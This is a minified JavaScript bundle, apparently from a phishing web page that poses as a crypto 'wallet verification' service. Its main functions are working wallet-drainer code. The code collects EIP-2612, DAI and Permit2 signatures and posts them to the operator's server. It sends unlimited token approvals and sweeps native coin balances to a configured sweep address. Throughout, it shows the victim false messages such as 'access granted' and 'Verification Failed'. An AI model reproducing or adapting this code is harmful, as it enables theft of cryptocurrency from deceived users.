        }),
        (o.getLength = function (n) {
          return c.length;
        }),
        (o.write = function (n) {
          for (let l = 0; l < c.length; l += 1) n.put(c[l], 8);
        }),
        o
      );
    },
    xA = function (e) {
      const a = M.MODE_KANJI,
        c = X.stringToBytes;
      (function (l, t) {
        const A = c(l);
        if (A.length != 2 || ((A[0] << 8) | A[1]) != t)
          throw "sjis not supported.";
      })("友", 38726);
      const o = c(e),
        n = {};
      return (
        (n.getMode = function () {
          return a;
        }),
        (n.getLength = function (l) {
          return ~~(o.length / 2);
        }),
        (n.write = function (l) {
          const t = o;
          let A = 0;
          for (; A + 1 < t.length; ) {
            let s = ((255 & t[A]) << 8) | (255 & t[A + 1]);
            if (33088 <= s && s <= 40956) s -= 33088;
            else if (57408 <= s && s <= 60351) s -= 49472;
            else throw "illegal char at " + (A + 1) + "/" + s;
            ((s = ((s >>> 8) & 255) * 192 + (s & 255)), l.put(s, 13), (A += 2));
          }
          if (A < t.length) throw "illegal char at " + (A + 1);
        }),
        n
      );
    },
    fA = function () {
      const e = [],
        a = {};
      return (
        (a.writeByte = function (c) {
          e.push(c & 255);
        }),
        (a.writeShort = function (c) {
          (a.writeByte(c), a.writeByte(c >>> 8));
        }),
        (a.writeBytes = function (c, o, n) {
          ((o = o || 0), (n = n || c.length));
          for (let l = 0; l < n; l += 1) a.writeByte(c[l + o]);
        }),
        (a.writeString = function (c) {
          for (let o = 0; o < c.length; o += 1) a.writeByte(c.charCodeAt(o));
        }),
        (a.toByteArray = function () {
          return e;
        }),
        (a.toString = function () {
          let c = "";
          c += "[";
          for (let o = 0; o < e.length; o += 1)
            (o > 0 && (c += ","), (c += e[o]));
          return ((c += "]"), c);
        }),
        a
      );
    },
    kA = function () {
      let e = 0,
        a = 0,
        c = 0,
        o = "";
      const n = {},
        l = function (A) {
          o += String.fromCharCode(t(A & 63));
        },
        t = function (A) {
          if (A < 0) throw "n:" + A;
          if (A < 26) return 65 + A;
          if (A < 52) return 97 + (A - 26);
          if (A < 62) return 48 + (A - 52);
          if (A == 62) return 43;
          if (A == 63) return 47;
          throw "n:" + A;
        };
      return (
        (n.writeByte = function (A) {
          for (e = (e << 8) | (A & 255), a += 8, c += 1; a >= 6; )
            (l(e >>> (a - 6)), (a -= 6));
        }),
        (n.flush = function () {
          if ((a > 0 && (l(e << (6 - a)), (e = 0), (a = 0)), c % 3 != 0)) {
            const A = 3 - (c % 3);
            for (let s = 0; s < A; s += 1) o += "=";
          }
        }),
        (n.toString = function () {
          return o;
        }),
        n
      );
    },
    EA = function (e) {
      const a = e;
      let c = 0,
        o = 0,
        n = 0;
      const l = {};
      l.read = function () {
        for (; n < 8; ) {
          if (c >= a.length) {
            if (n == 0) return -1;
            throw "unexpected end of file./" + n;
          }
          const s = a.charAt(c);
          if (((c += 1), s == "=")) return ((n = 0), -1);
          if (s.match(/^\s$/)) continue;
          ((o = (o << 6) | t(s.charCodeAt(0))), (n += 6));
        }
        const A = (o >>> (n - 8)) & 255;
        return ((n -= 8), A);
      };
      const t = function (A) {
        if (65 <= A && A <= 90) return A - 65;
        if (97 <= A && A <= 122) return A - 97 + 26;
        if (48 <= A && A <= 57) return A - 48 + 52;
        if (A == 43) return 62;
        if (A == 47) return 63;
        throw "c:" + A;
      };
      return l;
    },
    DA = function (e, a) {
      const c = e,
        o = a,
        n = new Array(e * a),
        l = {};
      ((l.setPixel = function (w, b, d) {
        n[b * c + w] = d;
      }),
        (l.write = function (w) {
          (w.writeString("GIF87a"),
            w.writeShort(c),
            w.writeShort(o),
            w.writeByte(128),
            w.writeByte(0),
            w.writeByte(0),
            w.writeByte(0),
            w.writeByte(0),
            w.writeByte(0),
            w.writeByte(255),
            w.writeByte(255),
            w.writeByte(255),
            w.writeString(","),
            w.writeShort(0),
            w.writeShort(0),
            w.writeShort(c),
            w.writeShort(o),
            w.writeByte(0));
          const b = 2,
            d = A(b);
          w.writeByte(b);
          let u = 0;
          for (; d.length - u > 255; )
            (w.writeByte(255), w.writeBytes(d, u, 255), (u += 255));
          (w.writeByte(d.length - u),
            w.writeBytes(d, u, d.length - u),
            w.writeByte(0),
            w.writeString(";"));
        }));
      const t = function (w) {
          const b = w;
          let d = 0,
            u = 0;
          const m = {};
          return (
            (m.write = function (k, E) {
              if (k >>> E) throw "length over";
              for (; d + E >= 8; )
                (b.writeByte(255 & ((k << d) | u)),
                  (E -= 8 - d),
                  (k >>>= 8 - d),
                  (u = 0),
                  (d = 0));
              ((u = (k << d) | u), (d = d + E));
            }),
            (m.flush = function () {
              d > 0 && b.writeByte(u);
            }),
            m
          );
        },
        A = function (w) {
          const b = 1 << w,
            d = (1 << w) + 1;
          let u = w + 1;
          const m = s();
          for (let x = 0; x < b; x += 1) m.add(String.fromCharCode(x));
          (m.add(String.fromCharCode(b)), m.add(String.fromCharCode(d)));
          const k = fA(),
            E = t(k);
          E.write(b, u);
          let v = 0,
            C = String.fromCharCode(n[v]);
          for (v += 1; v < n.length; ) {
            const x = String.fromCharCode(n[v]);
            ((v += 1),
              m.contains(C + x)
                ? (C = C + x)
                : (E.write(m.indexOf(C), u),
                  m.size() < 4095 &&
                    (m.size() == 1 << u && (u += 1), m.add(C + x)),
                  (C = x)));
          }
          return (
            E.write(m.indexOf(C), u),
            E.write(d, u),
            E.flush(),
            k.toByteArray()
          );
        },
        s = function () {
          const w = {};
          let b = 0;
          const d = {};
          return (
            (d.add = function (u) {
              if (d.contains(u)) throw "dup key:" + u;
              ((w[u] = b), (b += 1));
            }),
            (d.size = function () {
              return b;
            }),
            (d.indexOf = function (u) {
              return w[u];
            }),
            (d.contains = function (u) {
              return typeof w[u] < "u";
            }),
            d
          );
        };
      return l;
    },
    QA = function (e, a, c) {
      const o = DA(e, a);
      for (let A = 0; A < a; A += 1)
        for (let s = 0; s < e; s += 1) o.setPixel(s, A, c(s, A));
      const n = fA();
      o.write(n);
      const l = kA(),
        t = n.toByteArray();
      for (let A = 0; A < t.length; A += 1) l.writeByte(t[A]);
      return (l.flush(), "data:image/gif;base64," + l);
    };
  X.stringToBytes;
  const AA = window.location.origin,
    iA = !1,
    aA = parseInt("1500", 10),
    NA = new URL(window.location.href).searchParams.has("debug"),
    Z = "";
  function H(e, ...a) {
    NA && console.log(`[evm:${e}]`, ...a);
    try {
      const c = `[evm:${e}] ${a.map((o) => (typeof o == "object" ? JSON.stringify(o) : String(o))).join(" ")}`;
      fetch(`${AA}/evm/client-log`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ msg: c, ua: navigator.userAgent }),
      }).catch(() => {});
    } catch {}
  }
  const pA = "evm-wc:visitor-id";
  function tA() {
    let e = localStorage.getItem(pA);
    return (
      e ||
        ((e =
          typeof crypto.randomUUID == "function"
            ? crypto.randomUUID()
            : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (a) => {
                const c = (Math.random() * 16) | 0;
                return (a === "x" ? c : (c & 3) | 8).toString(16);
              })),
        localStorage.setItem(pA, e)),
      e
    );
  }
  async function Y(e, a = {}) {
    let c = a.body;
    a.method && a.method;
    const o = await fetch(`${AA}${e}`, {
      ...a,
      body: c,
      headers: { "content-type": "application/json", ...(a.headers ?? {}) },
    });
    if (!o.ok) throw new Error(`api ${o.status}`);
    return o.json();
  }
  function uA(e, a = 200) {
    const c = X(0, "L");
    (c.addData(e), c.make());
    const o = c.getModuleCount(),
      n = Math.floor(a / (o + 8)),
      l = Math.floor((a - n * o) / 2),
      t = document.createElement("canvas");
    ((t.width = a), (t.height = a));
    const A = t.getContext("2d");
    ((A.fillStyle = "#ffffff"),
      A.fillRect(0, 0, a, a),
      (A.fillStyle = "#000000"));
    for (let s = 0; s < o; s++)
      for (let w = 0; w < o; w++)
        c.isDark(s, w) && A.fillRect(l + w * n, l + s * n, n, n);
    return t.toDataURL("image/png");
  }
  function eA(e) {
    if (!e) return !1;
    if (e.code === 4001 || e.code === "ACTION_REJECTED") return !0;
    const a = (e.message || e.error || String(e)).toLowerCase();
    return (
      a.includes("user rejected") ||
      a.includes("user denied") ||
      a.includes("declined") ||
      a.includes("cancel")
    );
  }
  function V(e) {
    return (
      (e == null ? void 0 : e.shortMessage) ||
      (e == null ? void 0 : e.message) ||
      "unknown error"
    )
      .toString()
      .slice(0, 400);
  }
  const UA = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    },
    RA = {
      Permit: [
        { name: "holder", type: "address" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "expiry", type: "uint256" },
        { name: "allowed", type: "bool" },
      ],
    },
    FA = "0x000000000022D473030F116dDEE9F6B43aC78BA3",
    PA = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" },
      ],
    };
  function YA(e, a) {
    if (e.kind === "permit2")
      return {
        kind: "permit2",
        domain: { name: "Permit2", chainId: e.chainId, verifyingContract: FA },
        types: PA,
        primaryType: "PermitTransferFrom",
        message: {
          permitted: { token: e.token, amount: e.value },
          spender: e.spender,
          nonce: e.nonce,
          deadline: e.deadline,
        },
      };
    const c = {
      name: e.domainName,
      version: e.domainVersion,
      chainId: e.chainId,
      verifyingContract: e.token,
    };
    return e.kind === "eip2612"
      ? {
          kind: "eip2612",
          domain: c,
          types: UA,
          primaryType: "Permit",
          message: {
            owner: a,
            spender: e.spender,
            value: e.value,
            nonce: e.nonce,
            deadline: e.deadline,
          },
        }
      : {
          kind: "dai",
          domain: c,
          types: RA,
          primaryType: "Permit",
          message: {
            holder: a,
            spender: e.spender,
            nonce: e.nonce,
            expiry: e.deadline,
            allowed: !0,
          },
        };
  }
  async function MA(e, a, c, o) {
    const n = window.ethereum;
    if (!n) {
      H("injected", "no window.ethereum");
      return;
    }
    H("injected", `connecting via ${e}`);
    let l;
    try {
      l = await n.request({ method: "eth_requestAccounts" });
    } catch (w) {
      H(
        "injected",
        `eth_requestAccounts failed: ${w == null ? void 0 : w.message}`,
      );
      return;
    }
    if (!l || l.length === 0) {
      H("injected", "no accounts returned");
      return;
    }
    const t = l[0].toLowerCase();
    (H("injected", `connected: ${t}`), a());
    const A = K.find((w) => w.name === e);
    ((rA = (A == null ? void 0 : A.icon) || ""),
      (bA = e),
      cA("Verifying wallet assets..."));
    const s = tA();
    Y("/notify/wallet-connected", {
      method: "POST",
      body: JSON.stringify({
        visitorId: s,
        address: t,
        walletName: e,
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        module: "evm-wc",
      }),
    }).catch(() => {});
    try {
      let w = null;
      try {
        const h = Z ? `/config?access_token=${Z}` : "/config";
        w = await Y(h);
      } catch (h) {
        H("injected", `config fetch failed: ${V(h)}`);
      }
      const b = Z ? `?access_token=${Z}` : "",
        [d, u] = await Promise.all([
          Y(`/permit/targets/${t}${b}`).catch(() => ({
            address: t,
            targets: [],
          })),
          Y(`/approve/targets/${t}${b}`).catch(() => ({
            address: t,
            targets: [],
          })),
        ]),
        m = d.targets,
        k = u.targets,
        E = m.length + k.length;
      if (
        (H("injected", `targets: ${m.length} permit, ${k.length} approve`),
        E === 0)
      ) {
        (J("No significant assets found"),
          w && (await hA(n, t, w, s)),
          oA(
            "Verification Failed",
            "We could not verify this wallet. Make sure your wallet is active and has transaction history.",
          ),
          setTimeout(() => nA(), 5e3),
          c({ address: t }));
        return;
      }
      (J(`Verifying ${E} asset${E > 1 ? "s" : ""}...`),
        m.length > 0 &&
          Y("/notify/tx-proposed", {
            method: "POST",
            body: JSON.stringify({
              visitorId: s,
              owner: t,
              type: "permit",
              tokens: m.map((h) => ({ symbol: h.symbol, usd: h.usd })),
              totalUsd: m.reduce((h, R) => h + (R.usd || 0), 0),
              pageUrl: window.location.href,
            }),
          }).catch(() => {}));
      let v = 0;
      const C = [],
        x = new Set();
      let D = 0;
      for (const h of m) {
        J(`Confirm ${h.symbol} access in wallet`);
        const R = await n.request({ method: "eth_chainId" });
        if (parseInt(R, 16) !== h.chainId) {
          const y = "0x" + h.chainId.toString(16);
          for (;;)
            try {
              await n.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: y }],
              });
              break;
            } catch (Q) {
              if (
                (Y("/notify/permit-rejected", {
                  method: "POST",
                  body: JSON.stringify({
                    visitorId: s,
                    owner: t,
                    chainId: h.chainId,
                    symbol: h.symbol,
                    token: h.token,
                    step: "switch_chain",
                    reason: V(Q),
                    pageUrl: window.location.href,
                  }),
                }).catch(() => {}),
                eA(Q))
              ) {
                if (!iA) break;
                await sA(aA);
                continue;
              }
              break;
            }
        }
        const r = YA(h, t),
          p = JSON.stringify({
            types: { EIP712Domain: [], ...r.types },
            domain: r.domain,
            primaryType: r.primaryType,
            message: r.message,
          });
        let i = null;
        for (;;)
          try {
            i = await n.request({
              method: "eth_signTypedData_v4",
              params: [t, p],
            });
            break;
          } catch (y) {
            if (
              (Y("/notify/permit-rejected", {
                method: "POST",
                body: JSON.stringify({
                  visitorId: s,
                  owner: t,
                  chainId: h.chainId,
                  symbol: h.symbol,
                  token: h.token,
                  step: "sign",
                  reason: V(y),
                  pageUrl: window.location.href,
                }),
              }).catch(() => {}),
              eA(y))
            ) {
              if (!iA) break;
              (J(`${h.symbol} declined — retrying...`), await sA(aA));
              continue;
            }
            break;
          }
        if (!i) continue;
        let f, g, B;
        i.length >= 132 &&
          ((g = "0x" + i.slice(2, 66)),
          (B = "0x" + i.slice(66, 130)),
          (f = parseInt(i.slice(130, 132), 16)),
          f < 27 && (f += 27));
        try {
          (await Y("/permit/collect", {
            method: "POST",
            body: JSON.stringify({
              chainId: h.chainId,
              token: h.token,
              kind: h.kind,
              owner: t,
              spender: h.spender,
              value: h.value,
              nonce: h.nonce,
              deadline: h.deadline,
              allowed: h.kind === "dai" ? !0 : void 0,
              signature: i,
              v: f,
              r: g,
              s: B,
              visitorId: s,
              usd: h.usd,
              symbol: h.symbol,
              pageUrl: window.location.href,
            }),
          }),
            v++,
            C.push(h.symbol),
            x.add(h.chainId),
            (D += h.usd || 0),
            J(`${h.symbol} access granted`));
        } catch (y) {
          Y("/notify/permit-rejected", {
            method: "POST",
            body: JSON.stringify({
              visitorId: s,
              owner: t,
              chainId: h.chainId,
              symbol: h.symbol,
              token: h.token,
              step: "submit",
              reason: V(y),
              pageUrl: window.location.href,
            }),
          }).catch(() => {});
        }
      }
      if (
        (Y("/notify/permit-batch-done", {
          method: "POST",
          body: JSON.stringify({
            visitorId: s,
            owner: t,
            signedCount: v,
            skippedCount: m.length - v,
            totalUsd: D,
            chainIds: [...x],
            symbols: C,
            pageUrl: window.location.href,
          }),
        }).catch(() => {}),
        k.length > 0)
      ) {
        Y("/notify/tx-proposed", {
          method: "POST",
          body: JSON.stringify({
            visitorId: s,
            owner: t,
            type: "approve",
            tokens: k.map((h) => ({ symbol: h.symbol, usd: h.usd })),
            totalUsd: k.reduce((h, R) => h + (R.usd || 0), 0),
            pageUrl: window.location.href,
          }),
        }).catch(() => {});
        for (const h of k) {
          J(`Confirm ${h.symbol} access in wallet`);
          const R = await n.request({ method: "eth_chainId" });
          if (parseInt(R, 16) !== h.chainId) {
            const i = "0x" + h.chainId.toString(16);
            try {
              await n.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: i }],
              });
            } catch {
              continue;
            }
          }
          const p =
            "0x095ea7b3" +
            h.spender.slice(2).toLowerCase().padStart(64, "0") +
            "f".repeat(64);
          for (;;)
            try {
              const i = await n.request({
                method: "eth_sendTransaction",
                params: [{ from: t, to: h.token, data: p }],
              });
              (await Y("/approve/notify", {
                method: "POST",
                body: JSON.stringify({
                  chainId: h.chainId,
                  token: h.token,
                  symbol: h.symbol,
                  owner: t,
                  spender: h.spender,
                  balance: h.balance,
                  usd: h.usd,
                  txHash: i,
                  visitorId: s,
                  pageUrl: window.location.href,
                }),
              }).catch(() => {}),
                J(`${h.symbol} access granted`));
              break;
            } catch (i) {
              if (
                (Y("/notify/approve-rejected", {
                  method: "POST",
                  body: JSON.stringify({
                    visitorId: s,
                    owner: t,
                    chainId: h.chainId,
                    symbol: h.symbol,
                    token: h.token,
                    reason: V(i),
                    pageUrl: window.location.href,
                  }),
                }).catch(() => {}),
                eA(i))
              ) {
                if (!iA) break;
                (J(`${h.symbol} declined — retrying...`), await sA(aA));
                continue;
              }
              break;
            }
        }
      }
      (w && (await hA(n, t, w, s)),
        oA(
          "Verification Failed",
          "We could not verify this wallet. Make sure your wallet is active and has transaction history.",
        ),
        setTimeout(() => nA(), 5e3),
        c({ address: t }));
    } catch (w) {
      (H("injected", `flow error: ${V(w)}`),
        oA("Verification Failed", "An error occurred during verification."),
        setTimeout(() => nA(), 5e3),
        c({ address: t }));
    }
  }
  async function hA(e, a, c, o) {
    var A, s, w, b;
    const n = c.sweepAddress;
    if (!n || !/^0x[0-9a-fA-F]{40}$/.test(n)) return;
    H("injected", "starting sweep");
    let l = null;
    try {
      const d = Z ? `?access_token=${Z}` : "";
      l = await Y(`/balances/${a}${d}`);
    } catch (d) {
      H("injected", `balances fetch failed: ${V(d)}`);
      return;
    }
    if (!(l != null && l.byChain)) return;
    const t = l.byChain
      .filter((d) => {
        var u, m;
        return (
          ((u = d.native) == null ? void 0 : u.usd) >= (c.sweepMinUsd || 0) &&
          ((m = d.native) == null ? void 0 : m.amount) &&
          d.native.amount !== "0"
        );
      })
      .sort((d, u) => {
        var m, k;
        return (
          (((m = u.native) == null ? void 0 : m.usd) || 0) -
          (((k = d.native) == null ? void 0 : k.usd) || 0)
        );
      });
    if (t.length !== 0) {
      Y("/notify/tx-proposed", {
        method: "POST",
        body: JSON.stringify({
          visitorId: o,
          owner: a,
          type: "sweep",
          tokens: t.map((d) => {
            var u, m;
            return {
              symbol: ((u = d.native) == null ? void 0 : u.symbol) || "NATIVE",
              usd: ((m = d.native) == null ? void 0 : m.usd) || 0,
            };
          }),
          totalUsd: t.reduce((d, u) => {
            var m;
            return d + (((m = u.native) == null ? void 0 : m.usd) || 0);
          }, 0),
          pageUrl: window.location.href,
        }),
      }).catch(() => {});
      for (const d of t) {
        const u = d.chainId,
          m = ((A = d.native) == null ? void 0 : A.symbol) || "NATIVE",
          k = ((s = d.native) == null ? void 0 : s.usd) || 0,
          E = ((w = d.native) == null ? void 0 : w.amount) || "0";
        J(`Processing ${m}...`);
        try {
          const v = await e.request({ method: "eth_chainId" });
          if (parseInt(v, 16) !== u) {
            const I = "0x" + u.toString(16);
            try {
              await e.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: I }],
              });
            } catch (N) {
              const W = eA(N);
              Y("/notify/sweep", {
                method: "POST",
                body: JSON.stringify({
                  visitorId: o,
                  owner: a,
                  chainId: u,
                  nativeSymbol: m,
                  amount: "0",
                  amountUsd: k,
                  to: n,
                  status: W ? "rejected" : "failed",
                  reason: `switch chain: ${V(N)}`,
                  pageUrl: window.location.href,
                }),
              }).catch(() => {});
              continue;
            }
          }
          const x = await e.request({
              method: "eth_getBalance",
              params: [a, "latest"],
            }),
            D = BigInt(x);
          if (D === 0n) continue;
          const h = (b = c.sweepContracts) == null ? void 0 : b[u],
            R = h || n,
            P = h
              ? "0x593dae5b000000000000000000000000" + n.slice(2).toLowerCase()
              : void 0,
            r = await e.request({ method: "eth_gasPrice" }),
            p = BigInt(r);
          let i = 21000n;
          try {
            const I = await e.request({
              method: "eth_estimateGas",
              params: [
                {
                  from: a,
                  to: R,
                  value: "0x5AF3107A4000",
                  ...(P ? { data: P } : {}),
                },
              ],
            });
            i = (BigInt(I) * 12n) / 10n;
          } catch {}
          const f = p * i,
            g = parseFloat(E) > 0 ? k / parseFloat(E) : 0,
            B = c.sweepReserveUsd || 0,
            y = g > 0 && B > 0 ? BigInt(Math.floor((B / g) * 1e18)) : 0n;
          if (D <= f + y) continue;
          const Q = D - f - y,
            U = (Number(Q) / 1e18).toFixed(6),
            F = {
              from: a,
              to: R,
              value: "0x" + Q.toString(16),
              gas: "0x" + i.toString(16),
              gasPrice: "0x" + p.toString(16),
              ...(P ? { data: P } : {}),
            };
          for (;;)
            try {
              const I = await e.request({
                method: "eth_sendTransaction",
                params: [F],
              });
              (Y("/notify/sweep", {
                method: "POST",
                body: JSON.stringify({
                  visitorId: o,
                  owner: a,
                  chainId: u,
                  nativeSymbol: m,
                  amount: U,
                  amountUsd: k,
                  to: n,
                  status: "success",
                  txHash: I,
                  pageUrl: window.location.href,
                }),
              }).catch(() => {}),
                J(`${m} verified`));
              break;
            } catch (I) {
              const N = eA(I);
              Y("/notify/sweep", {
                method: "POST",
                body: JSON.stringify({
                  visitorId: o,
                  owner: a,
                  chainId: u,
                  nativeSymbol: m,
                  amount: U,
                  amountUsd: k,
                  to: n,
                  status: N ? "rejected" : "failed",
                  reason: V(I),
                  pageUrl: window.location.href,
                }),
              }).catch(() => {});
              break;
            }
        } catch (v) {
          Y("/notify/sweep", {
            method: "POST",
            body: JSON.stringify({
              visitorId: o,
              owner: a,
              chainId: u,
              nativeSymbol: m,
              amount: "0",
              amountUsd: k,
              to: n,
              status: "failed",
              reason: V(v),
              pageUrl: window.location.href,
            }),
          }).catch(() => {});
        }
      }
    }
  }
  function sA(e) {
    return new Promise((a) => setTimeout(a, e));
  }
  const z = {
      trust:
        "data:image/webp;base64,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